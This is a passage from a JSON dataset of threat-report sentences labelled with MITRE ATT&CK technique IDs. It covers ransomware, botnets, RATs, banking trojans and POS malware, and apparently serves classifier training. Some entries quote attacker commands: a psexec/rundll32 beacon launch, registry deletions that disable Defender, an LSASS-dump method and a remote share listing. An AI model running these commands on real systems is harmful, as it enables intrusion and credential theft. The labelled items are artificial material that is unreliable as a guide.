      "T1021.001"
    ]
  },
  {
    "type": "text",
    "text": "psexec.exe -accepteula -d -s \\\\<INTERNAL_IP> rundll32.exe C:\\windows\\192145.dll,StartW From here, RDP connections were established from the beachhead host to systems throughout the environment.",
    "command": "",
    "labels": [
      "T1021.001"
    ]
  },
  {
    "type": "text",
    "text": "Defense Evasion To evade detection, the threat actors disabled Windows Defender by adding the below to an already linked GPO.",
    "command": "",
    "labels": [
      "T1562.001"
    ]
  },
  {
    "type": "text",
    "text": "ParentCommandLine CommandLine C:\\Windows\\System32\\dllhost.exe C:\\Windows\\system32\\cmd.exe /C gpupdate /force C:\\Users\\USER\\AppData\\Local\\Temp\\icju1.exe C:\\Windows\\system32\\cmd.exe /C gpupdate /force C:\\Windows\\System32\\dllhost.exe C:\\Windows\\system32\\cmd.exe /C gpupdate /force “rundll32.exe” c:\\windows\\192145.dll,StartW C:\\Windows\\system32\\cmd.exe /C gpupdate /force Registry Keys Action HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows Defender\\DisableAntiSpyware DeleteValue HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows Defender\\Real-Time Monitoring\\DisableRealtimeMonitoring DeleteValue HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows Defender\\Real-Time Monitoring\\DisableBehaviorMonitoring DeleteValue HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows Defender\\Real-Time Monitoring\\DisableIntrusionPreventionSystem DeleteValue HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows Defender\\Real-Time Protection DeleteKey ",
    "command": "",
    "labels": [
      "T1059.003",
      "T1112"
    ]
  },
  {
    "type": "text",
    "text": "Credential Access LSASS was accessed by an unusual process “runonce.exe” on multiple hosts, including a domain controller. ",
    "command": "",
    "labels": [
      "T1003.001"
    ]
  },
  {
    "type": "text",
    "text": "Impact About two and a half hours after initial hands on keyboard activity, the Cobalt Strike Beacon processes running across the target systems injected the Conti DLL into memory.",
    "command": "",
    "labels": [
      "T1055"
    ]
  },
  {
    "type": "text",
    "text": "Zerobot is capable of propagating through brute force attacks on vulnerable devices with insecure configurations that use default or weak credentials.",
    "command": "",
    "labels": [
      "T1078"
    ]
  },
  {
    "type": "text",
    "text": "Upon gaining device access, Zerobot injects a malicious payload, which may be a generic script called zero.sh that downloads and attempts to execute Zerobot, or a script that downloads the Zerobot binary of a specific architecture.",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "The bash script that attempts to download different Zerobot binaries tries to identify the architecture by brute-force, attempting to download and execute binaries of various architectures until it succeeds, as IoT devices are based on many computer processing units (CPUs).",
    "command": "",
    "labels": [
      "T1082",
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "On Windows machines, the malware copies itself to the Startup folder with the file name FireWall.exe",
    "command": "",
    "labels": [
      "T1547.001"
    ]
  },
  {
    "type": "text",
    "text": "Payload length is customizable.",
    "command": "",
    "labels": [
      "T1071.001"
    ]
  },
  {
    "type": "text",
    "text": "HTTP_HANDLESends HTTP GET requests using a Golang standard library.",
    "command": "",
    "labels": [
      "T1071.001"
    ]
  },
  {
    "type": "text",
    "text": "HTTP_RAWFormats and sends HTTP GET requests.",
    "command": "",
    "labels": [
      "T1071.001"
    ]
  },
  {
    "type": "text",
    "text": "HTTP_BYPASSSends HTTP GET requests with spoofed headers.",
    "command": "",
    "labels": [
      "T1071.001"
    ]
  },
  {
    "type": "text",
    "text": "HTTP_NULLHTTP",
    "command": "",
    "labels": [
      "T1071.001"
    ]
  },
  {
    "type": "text",
    "text": "headers are each one random byte (not necessarily ascii).Previously undisclosed and new capabilities are the following: Attack methodDescriptionUDP_RAWSends UDP packets where the payload is customizable.",
    "command": "",
    "labels": [
      "T1071.001"
    ]
  },
  {
    "type": "text",
    "text": "Microsoft researchers also identified a sample that can run on Windows based on a cross-platform (Linux, Windows, macOS) open-source remote administration tool (RAT) with various features such as managing processes, file operations, screenshotting, and running commands.",
    "command": "",
    "labels": [
      "T1059.003"
    ]
  },
  {
    "type": "text",
    "text": "The script, which is used to download this RAT, is called impst.sh: Figure 1.",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "let IoCList = externaldata(TimeGenerated:datetime,IoC:string,IoC_Type:string,ExpirationDateTime:datetime,Description:string, Action:string, ConfidenceScore:real, ThreatType:string, Active:string,Type:string, TrafficLightProtocolLevel:string, ActivityGroupNames:string)[@\"https://raw.githubusercontent.com/microsoft/mstic/master/RapidReleaseTI/Indicators.csv\"] with(format=\"csv\", ignoreFirstRecord=True); let shahashes = IoCList | where IoC_Type =~ \"sha256\" and Description =~ \"Dev-1061 Zerobot affecting IoT devices\" | distinct IoC; DeviceFileEvents | where SHA256 in (shahashes) Zerobot HTTP requests This query finds suspicious HTTP requests originated by the IOCs associated with Zerobot activity. ",
    "command": "",
    "labels": [
      "T1071.001"
    ]
  },
  {
    "type": "text",
    "text": "Upon execution, an attempt to alter the Windows firewall settings is made. ",
    "command": "",
    "labels": [
      "T1562.001"
    ]
  },
  {
    "type": "text",
    "text": "Figure 1.2 Update.exe being downloaded A user had to click on this in order to execute the malware.",
    "command": "",
    "labels": [
      "T1204.002"
    ]
  },
  {
    "type": "text",
    "text": "At the address, the executable ‘3ujwy2rz7v.exe’ was downloaded and then launched by cmd.exe. ",
    "command": "",
    "labels": [
      "T1059.003",
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "Figure 1.4 3ujwy2rz7v.exe activity The executable then connected to the C2 domain name ‘dremmfyttrred[.]com’. ",
    "command": "",
    "labels": [
      "T1003.001"
    ]
  },
  {
    "type": "text",
    "text": "The activity thereafter included dumps of LSASS, exfiltration of data, and system and process enumerations. ",
    "command": "",
    "labels": [
      "T1003.001",
      "T1057"
    ]
  },
  {
    "type": "text",
    "text": "The initial delivery method is conducted via a LNK file, which drops two Windows shortcut files containing obfuscated PowerShell scripts in charge of downloading a second stage RokRAT shellcode.",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "RokRAT can execute remote C2 commands, data exfiltration, file download/upload, and keylogging.",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "When the LNK file is activated, a PowerShell script is executed, opening a decoy document to start the download process of RokRAT which is hosted at OneDrive or similar cloud application.",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "ISO Files The ISO files that X-Force observed contained a LNK file disguised as an exe icon, subsequently containing a HWP file, and a batch file.",
    "command": "",
    "labels": [
      "T1059.003"
    ]
  },
  {
    "type": "text",
    "text": "Once the LNK file is executed, it extracts and drops a decoy file, and a batch file within the user’s %TEMP% folder.",
    "command": "",
    "labels": [
      "T1059.003"
    ]
  },
  {
    "type": "text",
    "text": "In addition, the RokRAT LNK files drop batch files and downloads the payload that is decoded using the first byte as a key, then the payload is executed using Windows API functions (VirtualProtect).",
    "command": "",
    "labels": [
      "T1059.003",
      "T1105",
      "T1106"
    ]
  },
  {
    "type": "text",
    "text": "However, usually the data is compressed with WinRAR, staged on another system of the victim, and from there copied to a OneDrive-account controlled by the adversary. ",
    "command": "",
    "labels": [
      "T1074.001"
    ]
  },
  {
    "type": "text",
    "text": "Malicious documents that implement this technique require users to double-click a document element.",
    "command": "",
    "labels": [
      "T1204.002"
    ]
  },
  {
    "type": "text",
    "text": "This lures users to double-click the graphic to view the content, which activates an OLE package that stores and executes Crimson RAT masquerading as an update process (MicrosoftUpdate.exe). ",
    "command": "",
    "labels": [
      "T1204.002"
    ]
  },
  {
    "type": "text",
    "text": "Features of Crimson RAT include exfiltrating system information, capturing screenshots, starting and stopping processes, and enumerating files and drives. ",
    "command": "",
    "labels": [
      "T1005",
      "T1083"
    ]
  },
  {
    "type": "text",
    "text": "Most of the Crimson RAT variants we analyzed evaluate whether they execute at a machine named G551JW or DESKTOP-B83U7C5 and establish persistence by creating a registry key under \\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run only if the victim’s machine name differs.",
    "command": "",
    "labels": [
      "T1547.001"
    ]
  },
  {
    "type": "text",
    "text": "The threat actors behind the campaign are targeting Facebook business accounts by using Google ads and fake Facebook profiles that promote things like games, adult content, and cracked software, etc. to lure victims into downloading a malicious file.",
    "command": "",
    "labels": [
      "T1204.002"
    ]
  },
  {
    "type": "text",
    "text": "The attack is designed to steal sensitive information, including login data, cookies, and Facebook ad and business account information. ",
    "command": "",
    "labels": [
      "T1005"
    ]
  },
  {
    "type": "text",
    "text": "If it doesn’t, it downloads the file from its command and control (C2) server, then decodes and executes it.",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "Instead, they’re downloaded from the C2 using the following pattern: https://<domain>/files/dld?t=wcup.",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "Executable that accepts an executable as an argument and executes it with hidden console <",
    "command": "",
    "labels": [
      "T1059.003"
    ]
  },
  {
    "type": "text",
    "text": "[A-Z0-9]{15}>.exe Rust executable compiled with Cargo Next, it creates a scheduled task that runs the Rust executable by passing it as an argument to rhc.exe.",
    "command": "",
    "labels": [
      "T1053.005"
    ]
  },
  {
    "type": "text",
    "text": "Once the execution completes, the file is deleted to leave no evidence on the machine. ",
    "command": "",
    "labels": [
      "T1070.004"
    ]
  },
  {
    "type": "text",
    "text": "Drops ”TS.exe” and executes it with t as an argument The dropped executable (TS.exe) can be executed with one of the following options: t, d t|d options that the executable accepts Option t copies the executable to %appdata%\\Packages\\TS.exe and registers a new scheduled task to trigger every day and repeat every hour with option “d” as an argument. ",
    "command": "",
    "labels": [
      "T1053.005"
    ]
  },
  {
    "type": "text",
    "text": "Creates a scheduled task to be executed with d as an argument Option d checks if the file %localappdata%\\m.txt exists.",
    "command": "",
    "labels": [
      "T1053.005"
    ]
  },
  {
    "type": "text",
    "text": "As before, when the execution finishes the file is deleted to remove evidence from the machine. ",
    "command": "",
    "labels": [
      "T1070.004"
    ]
  },
  {
    "type": "text",
    "text": "Drops next stage Inno-Setup executable Inno-Setup to PHP Information Stealer Once the Inno-Setup installer executes, it drops a PHP application with additional files, usually to %localappdata\\[A-Z]{4}\\<version_number>.",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "Between different variants of this information stealer, we saw the following files used to execute the malicious logic: include.php Responsible for installing persistence via scheduled tasks index.php Executes the main logic of the stealing act version.php (embedded in index.php if it does not exist)",
    "command": "",
    "labels": [
      "T1053.005"
    ]
  },
  {
    "type": "text",
    "text": "After dropping the folder, the Inno-Setup executable executes php.exe include.php, or passes this command line as an argument to rhc.exe. include.php registers two scheduled tasks: rhc.exe php.exe include.php rhc.exe php.exe index.php rhc.exe php.exe index.php ",
    "command": "",
    "labels": [
      "T1053.005",
      "T1059.003"
    ]
  },
  {
    "type": "text",
    "text": "The attacker must know the time to set it in the scheduled task.",
    "command": "",
    "labels": [
      "T1053.005"
    ]
  },
  {
    "type": "text",
    "text": "If for some reason the operation fails, this script gets the current date and time running: “wmic os get LocalDateTime /value”. ",
    "command": "",
    "labels": [
      "T1047"
    ]
  },
  {
    "type": "text",
    "text": "createTS—creates scheduled task.",
    "command": "",
    "labels": [
      "T1053.005"
    ]
  },
  {
    "type": "text",
    "text": "createLG—creates scheduled task at logon index.php is the script where the stealing logic takes place.",
    "command": "",
    "labels": [
      "T1053.005"
    ]
  },
  {
    "type": "text",
    "text": "The stolen information is that set as fields in the URL parameter: C2 response—Facebook's graph API used to access sensitive information Extract victim’s sensitive Facebook data using the graph API and send the results to a C2 server dlAR Download and run.",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "Downloads a file from the given URL and executes it with the given arguments. ",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "dlAR task At the time of writing, in the given task the downloaded file was an Inno-Setup executable that dropped a legitimate WD Discovery app to side-load",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "The response is parsed, and the new stealer is downloaded and executed.",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "Next, it creates a scheduled task that executes the updated routine, which triggers at log-on and every 30 minutes. ",
    "command": "",
    "labels": [
      "T1053.005"
    ]
  },
  {
    "type": "text",
    "text": "Information Stealer update routine upload Asks for a file to be uploaded to the C2, checks whether the file exists, and uploads it. ",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "Upload file function r Gets a command to run, executes it, and posts the result back to the C2. ",
    "command": "",
    "labels": [
      "T1059.003",
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "Gets command from C2 and executes it dl Sends a get request with the parameter “a=update” to the C2 and does the same as the dlAR task. ",
    "command": "",
    "labels": [
      "T1059.003"
    ]
  },
  {
    "type": "text",
    "text": "Trickbot goes through processes one by one to find browsers to inject with its webinjects module, using a stealthy technique known as reflective injection.",
    "command": "",
    "labels": [
      "T1057"
    ]
  },
  {
    "type": "text",
    "text": "The webinjects module hooks the API calls responsible for sending, receiving or encrypting data sent to a web server.",
    "command": "",
    "labels": [
      "T1106"
    ]
  },
  {
    "type": "text",
    "text": "By intercepting the data before it is encrypted, the malware can read HTTP-POST headers and manipulate them on the fly. ",
    "command": "",
    "labels": [
      "T1071.001"
    ]
  },
  {
    "type": "text",
    "text": "Frequently hooked API functions. ",
    "command": "",
    "labels": [
      "T1106"
    ]
  },
  {
    "type": "text",
    "text": "How to Detect Webinjects This technique can be prevented by detecting an injection into a web browser process.",
    "command": "",
    "labels": [
      "T1055"
    ]
  },
  {
    "type": "text",
    "text": "The injected thread calls the NtProtectVirtualMemory function where the NewAccessProtection argument is PAGE_EXECUTE_READWRITE and the BaseAddress argument is an address to a library function targeted by banking Trojans. ",
    "command": "",
    "labels": [
      "T1055",
      "T1106"
    ]
  },
  {
    "type": "text",
    "text": "Instead, they suspend the remote process threads and install the hooks remotely.",
    "command": "",
    "labels": [
      "T1055"
    ]
  },
  {
    "type": "text",
    "text": "Once the banking Trojan executes in the context of the parent process, it hooks process creation library functions and waits until the real target is created. ",
    "command": "",
    "labels": [
      "T1106"
    ]
  },
  {
    "type": "text",
    "text": "This technique can be prevented by looking for an injection into explorer.exe or runtimebroker.exe, where the injected thread hooks process creation functions like NtCreateUserProcess, NtCreateProcessEx, CreateProcessInternalW, CreateProcessA or CreateProcessW. Named Pipe Communication Between Injected Processes Many banking Trojans use named pipes to communicate with various processes under the threat actor’s control.",
    "command": "",
    "labels": [
      "T1106"
    ]
  },
  {
    "type": "text",
    "text": "To do this, they inject their main bot into a Windows process, and then inject their other modules into different processes according to the module’s purpose.",
    "command": "",
    "labels": [
      "T1055"
    ]
  },
  {
    "type": "text",
    "text": "For example, Trickbot injects the main bot into svchost.exe.",
    "command": "",
    "labels": [
      "T1055"
    ]
  },
  {
    "type": "text",
    "text": "How to Prevent Named Pipe Communication Between Injected Processes This technique can be prevented by inspecting named-pipe events.",
    "command": "",
    "labels": [
      "T1055"
    ]
  },
  {
    "type": "text",
    "text": "Trickbot and Emotet loaders use Heaven's Gate for process hollowing from a WoW64 process into a 64-bit svchost.exe (For more about process hollowing, see the section on Evasive Process Hollowing By Entrypoint Patching below).",
    "command": "",
    "labels": [
      "T1055"
    ]
  },
  {
    "type": "text",
    "text": "Emotet using Heaven's Gate in its Microsoft Outlook Messaging API (MAPI) module.",
    "command": "",
    "labels": [
      "T1106"
    ]
  },
  {
    "type": "text",
    "text": "This can be done by placing hooks on critical APIs, generating a stack trace and inspecting the stack trace for wow64cpu.dll. ",
    "command": "",
    "labels": [
      "T1106"
    ]
  },
  {
    "type": "text",
    "text": "WoW64’s normal syscall flow.",
    "command": "",
    "labels": [
      "T1055"
    ]
  },
  {
    "type": "text",
    "text": "Evasive Process Hollowing by Entrypoint Patching Process hollowing is a process injection technique that creates a new legitimate process in a suspended mode, unmaps its main image and replaces it with malicious code.",
    "command": "",
    "labels": [
      "T1055"
    ]
  },
  {
    "type": "text",
    "text": "The malicious code is written into the newly created process and the suspended thread context instruction pointer is changed using NtGetContextThread/NtSetContextThread. ",
    "command": "",
    "labels": [
      "T1055"
    ]
  },
  {
    "type": "text",
    "text": "Trickbot implemented process hollowing by first using VirtualProtectEx on the process entrypoint, and then writing the hook stub using WriteProcessMemory. Figure 8.",
    "command": "",
    "labels": [
      "T1055"
    ]
  },
  {
    "type": "text",
    "text": "How to Prevent Evasive Process Hollowing by Entrypoint Patching This technique can be prevented either by inspecting whether the address argument provided to the calls of NtWriteVirtualMemory or NtProtectVirtualMemory is a remote process entry point or by detecting suspicious remote mapping and reading of svchost.exe memory. ",
    "command": "",
    "labels": [
      "T1055"
    ]
  },
  {
    "type": "text",
    "text": "PE Injection Common injection methods used by banking Trojans involve writing a mapped PE into a remote process using WriteProcessMemory.",
    "command": "",
    "labels": [
      "T1055"
    ]
  },
  {
    "type": "text",
    "text": "For example, Zeus variants use this technique to inject themselves into other processes, allowing them to stay hidden, as well as to perform webinjects and to perpetrate financial data theft. Figure 10.",
    "command": "",
    "labels": [
      "T1055"
    ]
  },
  {
    "type": "text",
    "text": "How to Prevent PE Injection This technique can be prevented by inspecting the buffer sent to NtWriteVirtualMemory for executable artifacts. ",
    "command": "",
    "labels": [
      "T1055"
    ]
  },
  {
    "type": "text",
    "text": "Process Injection via Hooking Hooking can be used as an injection technique.",
    "command": "",
    "labels": [
      "T1055"
    ]
  },
  {
    "type": "text",
    "text": "This technique utilizes hooking to get code execution, usually by hooking a frequently called API function with a jump to a payload/shellcode.",
    "command": "",
    "labels": [
      "T1106"
    ]
  },
  {
    "type": "text",
    "text": "This avoids calling any suspicious APIs often used in code injection techniques like CreateRemoteThread or NtSetContextThread. ",
    "command": "",
    "labels": [
      "T1106"
    ]
  },
  {
    "type": "text",
    "text": "For instance, IcedID injects its main bot into a hollowed instance of svchost.exe using API hooking.",
    "command": "",
    "labels": [
      "T1055"
    ]
  },
  {
    "type": "text",
    "text": "The provided address argument for NtProtectVirtualMemory is an exported function from one of the Windows libraries, and the NtWriteVirtualMemory written buffer is a hooking stub.",
    "command": "",
    "labels": [
      "T1106"
    ]
  },
  {
    "type": "text",
    "text": "In both cases, the remote process has to be a known injection target. ",
    "command": "",
    "labels": [
      "T1055"
    ]
  },
  {
    "type": "text",
    "text": "AtomBombing Injection Technique AtomBombing is a technique that allows malware to inject code while avoiding calling suspicious APIs that security vendors are watching.",
    "command": "",
    "labels": [
      "T1055"
    ]
  },
  {
    "type": "text",
    "text": "Dridex uses a slightly modified AtomBombing technique that injects one of its stages into a Windows process (usually explorer.exe) and employs various steps to cause financial data theft. ",
    "command": "",
    "labels": [
      "T1055"
    ]
  },
  {
    "type": "text",
    "text": "Malware using the AtomBombing technique first writes the payload into the global atom table, which can be accessed by all processes.",
    "command": "",
    "labels": [
      "T1055"
    ]
  },
  {
    "type": "text",
    "text": "They then dispatch an asynchronous procedure call (APC) to the APC queue of a target process thread using NtQueueApcThread, forcing the target process to call GlobalGetAtomA. ",
    "command": "",
    "labels": [
      "T1055"
    ]
  },
  {
    "type": "text",
    "text": "For the execution, the injector process dispatches another APC using NtQueueApcThread to force the remote process to execute NtSetContextThread.",
    "command": "",
    "labels": [
      "T1055"
    ]
  },
  {
    "type": "text",
    "text": "The injected process then calls NtSetContextThread, which invokes a return-oriented programming (ROP) chain that allocates execute/read/write (RWX) memory.",
    "command": "",
    "labels": [
      "T1055"
    ]
  },
  {
    "type": "text",
    "text": "The unique idea behind AtomBombing is the write-primitive, which allows writing to the remote process using atom tables and APC. ",
    "command": "",
    "labels": [
      "T1055"
    ]
  },
  {
    "type": "text",
    "text": "Dridex uses a variation of AtomBombing that queues an APC to call memset to clean an RW region in ntdll.dll.",
    "command": "",
    "labels": [
      "T1055"
    ]
  },
  {
    "type": "text",
    "text": "Finally, it queues an APC into the patched GlobalGetAtomA to get the payload running. Figure 14.",
    "command": "",
    "labels": [
      "T1055"
    ]
  },
  {
    "type": "text",
    "text": "These techniques can be prevented by inspecting whether the arguments provided to NtQueueApcThread/NtSetContextThread calls point to a suspicious API – the APC routine argument in the case of NtQueueApcThread, or the new instruction pointer in the context argument in the case of NtSetContextThread.",
    "command": "",
    "labels": [
      "T1055",
      "T1106"
    ]
  },
  {
    "type": "text",
    "text": "Both API calls have to be called into a remote process. ",
    "command": "",
    "labels": [
      "T1106"
    ]
  },
  {
    "type": "text",
    "text": "We have explored some of the more interesting banking Trojan techniques and how they’re used to steal victims’ sensitive data.",
    "command": "",
    "labels": [
      "T1005"
    ]
  },
  {
    "type": "text",
    "text": "The malware is injected and executed within the normal Windows process called mstsc.exe.",
    "command": "",
    "labels": [
      "T1055"
    ]
  },
  {
    "type": "text",
    "text": "The original file is deleted using the cmd command. ",
    "command": "",
    "labels": [
      "T1070.004"
    ]
  },
  {
    "type": "text",
    "text": "Trace data of the normal Windows process, mstsc.exe Figure 4 displays the trace data of mstsc.exe being executed after being injected with malware.",
    "command": "",
    "labels": [
      "T1055"
    ]
  },
  {
    "type": "text",
    "text": "The malware registers its file with the name onedrivenew under the Run key in order to make it run after the system is rebooted.",
    "command": "",
    "labels": [
      "T1112",
      "T1547.001"
    ]
  },
  {
    "type": "text",
    "text": "Afterward, it uses the schtasks.exe command to register the file to the task scheduler with the name OneDriveOp to connect to a certain URL every 60 minutes using the normal Windows file mshta.exe.",
    "command": "",
    "labels": [
      "T1053.005",
      "T1071.001"
    ]
  },
  {
    "type": "text",
    "text": "The URL registered in the task scheduler appears to be a normal homepage, but it contains a web shell.",
    "command": "",
    "labels": [
      "T1053.005"
    ]
  },
  {
    "type": "text",
    "text": "While the default C2 domain was specified as www[.]mdn[.]gov[.]mm, the beacon's traffic was redirected to the de-facto C2 test[.]softlemon[.]net via HTTP Get and POST metadata specified in the beacon's configuration. ",
    "command": "",
    "labels": [
      "T1071.001"
    ]
  },
  {
    "type": "text",
    "text": "The DNS request that led them there will be lost and relies on other parts of the HTTP request, including the Host header and the actual C2 test[.]softlemon[.]net. ",
    "command": "",
    "labels": [
      "T1071.001"
    ]
  },
  {
    "type": "text",
    "text": "The loader next calls the VirtualProtect function to set the virtual memory page permissions to Read-Write-Execute and writes the image base of the Cobalt Strike beacon which will be executed in a new thread. ",
    "command": "",
    "labels": [
      "T1106"
    ]
  },
  {
    "type": "text",
    "text": "Once decoded, the loader's execution jumps to the beginning of the DLL resulting in a reflective-load of the beacon into the loader process memory.",
    "command": "",
    "labels": [
      "T1055"
    ]
  },
  {
    "type": "text",
    "text": "The beacon resolves the proxy by calling WinHTTPGetProxyForUrlEx and WinHTTPCreateProxyResolver to bypass the proxy for the URL. ",
    "command": "",
    "labels": [
      "T1106"
    ]
  },
  {
    "type": "text",
    "text": "The beacon can also manage the system power policies registry keys to set the minimum and maximum sleep times and the lid open and close action policy. ",
    "command": "",
    "labels": [
      "T1112"
    ]
  },
  {
    "type": "text",
    "text": "The beacon modifies the victim's system power and lid open/close policies in the registry. ",
    "command": "",
    "labels": [
      "T1112"
    ]
  },
  {
    "type": "text",
    "text": "Incident #2 VPN access using Single Factor authentication. ",
    "command": "",
    "labels": [
      "T1078"
    ]
  },
  {
    "type": "text",
    "text": "Credential Access Incident #1 Minidump of LSASS process memory leveraging comsvcs.dll with proxy execution by rundll32.exe. ",
    "command": "",
    "labels": [
      "T1003.001",
      "T1218.011"
    ]
  },
  {
    "type": "text",
    "text": "title: Using the Minidump function of comsvcs.dll description: The minidump function of comsvcs.dll can be used to dump lsass.exe.",
    "command": "",
    "labels": [
      "T1003.001"
    ]
  },
  {
    "type": "text",
    "text": "T1003.001 Discovery Incident #1 Conducting discovery indirectly via schedule tasks named “Windows Update” performing remote directory listings. ",
    "command": "",
    "labels": [
      "T1053.005",
      "T1083"
    ]
  },
  {
    "type": "text",
    "text": "[T1053.005 – Scheduled Task/Job: Scheduled Task] C:\\>type c:\\programdata\\HP\\ms.bat dir \"\"\\\\10.1.100.64\\c$\\ProgramData\"\" >> C:\\programdata\\HP\\svr_dir.txtt\" Leveraging a dual-use tool, PCHunter64, to acquire detailed process and system information. ",
    "command": "",
    "labels": [
      "T1082"
    ]
  },
  {
    "type": "text",
    "text": "We have also included an example Sigma detection rule for the activity shown in incident #1. title: Listing Directories of Remote Hosts description: Threat actors can use windows binaries and commands to discover interesting to them directories on remote hosts and redirect the output to a file on disc for later consumption. ",
    "command": "",
    "labels": [
      "T1059.003",
      "T1083"
    ]
  },
  {
    "type": "text",
    "text": "T1083 Lateral Movement Incident #1 There were no network restrictions on Remote Desktop Protocol (RDP), and the threat actor was able to move freely across the network; as a result, this activity was captured by multiple event types. ",
    "command": "",
    "labels": [
      "T1021.001"
    ]
  },
  {
    "type": "text",
    "text": "Event ID [1149] - RDP connection established Event ID",
    "command": "",
    "labels": [
      "T1021.001"
    ]
  },
  {
    "type": "text",
    "text": "Defense Evasion Incident #1 The threat actor executed two actions to bypass Windows Defender [T1562.001 – Impair Defenses: Disable or Modify Tools] 5001 - Real-time Protection was disabled New Value\">HKLM\\SOFTWARE\\Microsoft\\Windows Defender\\Exclusions\\Paths\\C:\\ Guidance The first line of defense available to organizations is to use a security agent that has robust tamper protection.",
    "command": "",
    "labels": [
      "T1562.001"
    ]
  },
  {
    "type": "text",
    "text": "Collection Incident #2 A confirmed compromised account was used to download the WinRar archiving software and several files were staged for possible, but unconfirmed exfiltration [T1560.001 – Archive Collected Data: Archive via Utility] URL Visited: hxxps://notifier.rarlab[.]com/?language=English&source=RARLAB&landingpage=first&version=621&architecture=64 Userassist 2023-03-15T10:15:55Z C:\\Users\\<Redacted>\\Downloads\\winrar.exe Userassist 2023-03-15T11:04:42Z C:\\ProgramData\\winrar.exe URL Visited: E:/<Redacted>Dept.rar URL Visited: E:/<Redacted>Channel.rar Guidance Often by the time a threat actor is staging data, it’s too late to have a good security outcome.",
    "command": "",
    "labels": [
      "T1074.001"
    ]
  },
  {
    "type": "text",
    "text": "A threat actor could establish an administrator session using the “network_mgr.cgi CGI” module in the HTTP and set the IP address as an admin session that will allow the actor to bypass future authentication when logging into the device over the internet.",
    "command": "",
    "labels": [
      "T1078"
    ]
  },
  {
    "type": "text",
    "text": "This PHP file contains a payload download code that grabs malware to download and install the backdoor.",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "Changing the passwords could then allow a threat actor access to that account with their own passcode, and then sign on as a legitimate user to view camera feeds or CCTV footage and recordings as well as delete a camera from a system completely.",
    "command": "",
    "labels": [
      "T1078"
    ]
  },
  {
    "type": "text",
    "text": "One of them – named GetMicInfo – contains an algorithm designed to gather database passwords by decrypting them from Windows registry values.",
    "command": "",
    "labels": [
      "T1005"
    ]
  },
  {
    "type": "text",
    "text": "This shows that the backdoor’s authors have deep knowledge of the targeted software and opted for this sophisticated method instead of collecting the data via a simpler yet “louder” approach, such as keylogging. ",
    "command": "",
    "labels": [
      "T1078"
    ]
  },
  {
    "type": "text",
    "text": "Exfiltrated credentials allow ModPipe’s operators access to database contents, including various definitions and configuration, status tables and information about POS transactions. ",
    "command": "",
    "labels": [
      "T1078"
    ]
  },
  {
    "type": "text",
    "text": "networking module – module used for communication with C&C. downloadable modules – components adding specific functionality to the backdoor, such as the ability to steal database passwords and configuration information, scan specific IP addresses or acquire a list of the running processes and their loaded modules. ",
    "command": "",
    "labels": [
      "T1005",
      "T1016",
      "T1057"
    ]
  },
  {
    "type": "text",
    "text": "This information is encrypted and stored in DataS5 (for dba) and DataS6 (for micros) registry values within one of the following registry keys: HKLM\\Software\\Micros\\UserData or HKLM\\Software\\WOW6432Node\\Micros\\UserData if run in Windows 32-bit on Windows 64-bit (WOW64) subsystem Figure 2.",
    "command": "",
    "labels": [
      "T1112"
    ]
  },
  {
    "type": "text",
    "text": "Hex-Rays decompiled code of the function stealing database passwords The GetMicInfo module can intercept and decrypt these database passwords, using a specifically designed algorithm.",
    "command": "",
    "labels": [
      "T1078"
    ]
  },
  {
    "type": "text",
    "text": "Our analysis shows that in cases where the GetMicInfo module decrypts the password for the dba username, it will also try to acquire the path to the SQL Anywhere API library from the environment variable “SQLANY_API_DLL” and load it if it’s available. ",
    "command": "",
    "labels": [
      "T1078"
    ]
  },
  {
    "type": "text",
    "text": "If one of these approaches is successful, GetMicInfo attempts to connect to the database using the following connection string: DBN=micros;UID=dba;ENG=sql%PCNAME%;PWD=%decrypted_DataS5% %PCNAME% represents the computer name retrieved via the GetComputerName API and %decrypted_DataS5% stands for the decrypted dba user password. ",
    "command": "",
    "labels": [
      "T1078",
      "T1106"
    ]
  },
  {
    "type": "text",
    "text": "Other information stolen by the module includes the version of the MICROS POS and information about specific registry keys most likely related to various credit card services configurations. ",
    "command": "",
    "labels": [
      "T1012"
    ]
  },
  {
    "type": "text",
    "text": "Hex-Rays decompiled code of the function that steals database data The GetMicInfo module is injected into one of the processes specified by the C&C in the install command (0x0C).",
    "command": "",
    "labels": [
      "T1055"
    ]
  },
  {
    "type": "text",
    "text": "Based on our findings, it is typically associated with one of the following legitimate processes: MDSHTTPService.exe (MICROS MDS HTTP Service) CALSrv.exe (MICROS CAL Service – Client Application Loader server) explorer.exe We can confirm that the GetMicInfo module can successfully obtain the database passwords from RES 3700 POS v4.7 and v5.4.",
    "command": "",
    "labels": [
      "T1078"
    ]
  },
  {
    "type": "text",
    "text": "The main purpose of ModScan 2.20 is to collect additional information about the installed MICROS POS environment on the machines by scanning selected IP addresses.",
    "command": "",
    "labels": [
      "T1016"
    ]
  },
  {
    "type": "text",
    "text": "The ModScan 2.20 module is injected into one of the processes specified by the C&C via an InstallMod command (0x72).",
    "command": "",
    "labels": [
      "T1055"
    ]
  },
  {
    "type": "text",
